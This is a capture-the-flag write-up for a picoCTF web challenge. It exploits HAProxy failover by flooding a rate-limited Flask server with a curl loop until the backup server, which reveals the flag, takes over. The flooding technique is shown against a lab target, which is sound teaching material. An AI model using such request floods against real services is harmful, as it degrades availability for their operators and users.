# Failure Failure
Challenge Description:
> Welcome to Failure Failure — a high-available system. This challenge simulates a real-world failover scenario where one server is prioritized over the other. A load balancer stands between you and the truth — and it won't hand over the flag until you force its hand.

CTF: <b>picoCTF 2026</b>
<br>Points: <b>200</b>
<br>Difficulty: <b>Easy</b>

<b>[Jump to solution](#solution)</b>

## Hints
Here are the hints provided by the challenge author.
<details>
<summary>Hint 1</summary>

> How does a load balancer decide which server should get the traffic?
</details>

## Procedure
The target for this challenge is a simple website that doesn't give us anything. When looking at the provided HAProxy configuration file, it looks like our requests are sent to a server s1 as long as s1 is returning HTTP 200 (OK). If s1 fails, the backup server s2 takes over.
```
frontend http-in
    bind *:80
    default_backend servers

backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3
```

Looking at the provided flask source code, the website seems to have a rate limit of 300 requests per minute. Additionally, only the backup server prints the flag.
```py
# Custom error handler for rate limit exceeded
@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503

@app.route('/')
@limiter.limit("300 per minute")
def home():
    print("value:", os.getenv("IS_BACKUP"))
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
```

Therefore, we can cause s1 to "fail" by spamming it with enough requests (over 300 per minute), and then browse to the website shortly after (about 2 seconds later as per the HAProxy config) to get the flag.
```
$ cat ./fail
#!/bin/bash

for n in {1..301};
do
    curl http://mysterious-sea.picoctf.net:52370/
done
```

```
$ ./fail
...
Service Unavailable: Rate limit exceededService Unavailable: Rate limit exceededService Unavailable: Rate limit exceededService Unavailable: Rate limit exceededService Unavailable: Rate limit exceeded^C
$ curl http://mysterious-sea.picoctf.net:52370/
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <title>
Expense Tracker
</title>
        <link rel="stylesheet" type="text/css" href="/static/css/materialize.min.css" />
        <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    </head>

    <body>
        <nav>
            <div class="nav-wrapper">
                <a href="/" class="brand-logo">Home</a>
            </div>
        </nav>

        <div class="container">
            
                
            
            
<h1>Welcome!!</h1>
<p>hammy{u win - hammy}</p>
```

## Solution
1. Send at least 300 requests to the website within 1 minute, or keep sending until you get rate limit exceeded errors
2. Wait a couple of seconds and send one last request to get the flag
